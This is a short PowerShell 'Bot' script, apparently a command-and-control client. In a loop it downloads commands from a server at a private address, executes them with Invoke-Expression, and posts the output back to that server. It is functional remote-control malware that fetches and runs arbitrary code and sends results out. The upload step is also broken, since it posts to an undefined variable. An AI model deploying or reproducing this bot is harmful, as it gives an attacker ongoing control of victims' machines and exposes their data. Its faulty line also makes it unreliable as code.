
# Bot
#
# 1. Read the command from the CCC Website
$CCC_URL_Base = "http://10.11.8.38"
$CCC_URL_CommandToExecute = $CCC_URL_Base + "/commandToExecute.txt"
$CCC_URL_UploadResults = $CCC_URL_Base + "/uploadResults.php"

while ($true)
{
    $commndToExecute = Invoke-WebRequest $CCC_URL_CommandToExecute

    # 2. Execute the command
    $commandResult = Invoke-Expression ($commndToExecute.Content)
    
    # 3. Convert the results to plain text so that they can be easily posted to the C&C
    $commandResultText = $commandResult | Out-String

    # 4. POST the results (content of command_result.tmp) to the C&C
    $postParams = @{results=$commandResultText}
    Invoke-WebRequest -Uri $CCC_URL -Method POST -Body $postParams

    # 5. Sleep 10 seconds, and repeat
    Start-Sleep 10
}


